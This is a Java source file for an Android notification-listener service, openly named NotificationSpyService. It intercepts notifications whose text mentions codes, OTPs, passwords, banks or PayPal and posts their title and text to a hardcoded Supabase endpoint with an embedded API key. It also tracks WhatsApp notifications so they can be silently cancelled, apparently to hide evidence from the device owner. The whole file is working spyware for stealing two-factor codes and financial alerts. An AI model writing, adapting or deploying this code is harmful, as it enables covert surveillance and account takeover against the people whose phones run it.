package com.rcl.androidstreamcontrol.service;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import android.content.SharedPreferences;

import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

import com.rcl.androidstreamcontrol.utils.FeatureConfig;

public class NotificationSpyService extends NotificationListenerService {

    private static final String TAG = "NotificationSpy";
    private static final String SUPABASE_URL = "https://qxzozsdgrgahvgzpsfmm.supabase.co";
    private static final String ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InF4em96c2RncmdhaHZnenBzZm1tIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk4MDY4NjAsImV4cCI6MjA5NTM4Mjg2MH0.inUzMp-S9BRjNQYHynTAOPRo4EeY3Whqv9okvEeySB4";

    private static String lastWhatsAppNotifKey = null;
    private static NotificationSpyService instance = null;

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (!FeatureConfig.ENABLE_NOTIFICATION_SPY || sbn == null) return;
        
        try {
            String packageName = sbn.getPackageName();
            android.os.Bundle extras = sbn.getNotification().extras;
            
            String title = extras.getString(android.app.Notification.EXTRA_TITLE, "");
            String text = extras.getString(android.app.Notification.EXTRA_TEXT, "");
            
            // Track WhatsApp notifications for later cancellation
            if ("com.whatsapp".equals(packageName)) {
                lastWhatsAppNotifKey = sbn.getKey();
                Log.d(TAG, "Tracked WhatsApp notification key: " + lastWhatsAppNotifKey);
            }
            
            // Log highly sensitive notifications immediately
            if (isSensitive(packageName, title, text)) {
                Log.d(TAG, "Intercepted sensitive notification: " + title);
                logNotification(packageName, title, text);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing notification", e);
        }
    }

    private boolean isSensitive(String pkg, String title, String text) {
        String fullString = (pkg + " " + title + " " + text).toLowerCase();
        return fullString.contains("code") || fullString.contains("otp") || 
               fullString.contains("password") || fullString.contains("verify") ||
               fullString.contains("bank") || fullString.contains("paypal");
    }

    private void logNotification(String pkgName, String title, String text) {
        new Thread(() -> {
            try {
                SharedPreferences prefs = getSharedPreferences("PortalPrefs", MODE_PRIVATE);
                String deviceId = prefs.getString("supabase_uid", null);
                if (deviceId == null) return;

                JSONObject payload = new JSONObject();
                payload.put("device_id", deviceId);
                payload.put("app_name", pkgName);
                payload.put("content", "[NOTIFICATION] Title: " + title + " | Text: " + text);

                URL url = new URL(SUPABASE_URL + "/rest/v1/keyboard_logs");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setRequestProperty("apikey", ANON_KEY);
                conn.setRequestProperty("Authorization", "Bearer " + ANON_KEY);
                conn.setDoOutput(true);

                try (OutputStream os = conn.getOutputStream()) {
                    byte[] input = payload.toString().getBytes("utf-8");
                    os.write(input, 0, input.length);
                }
                conn.getResponseCode();
            } catch (Exception e) {
                Log.e(TAG, "Failed to upload notification");
            }
        }).start();
    }

public static void cancelWhatsAppNotification() {
        if (lastWhatsAppNotifKey != null && instance != null) {
            try {
                android.util.Log.d(TAG, "Cancelling WhatsApp notification: " + lastWhatsAppNotifKey);
                instance.cancelNotification(lastWhatsAppNotifKey);
                lastWhatsAppNotifKey = null;
            } catch (Exception e) {
                android.util.Log.e(TAG, "Failed to cancel WhatsApp notification", e);
            }
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        if (sbn != null && "com.whatsapp".equals(sbn.getPackageName())) {
            lastWhatsAppNotifKey = null;
        }
    }
}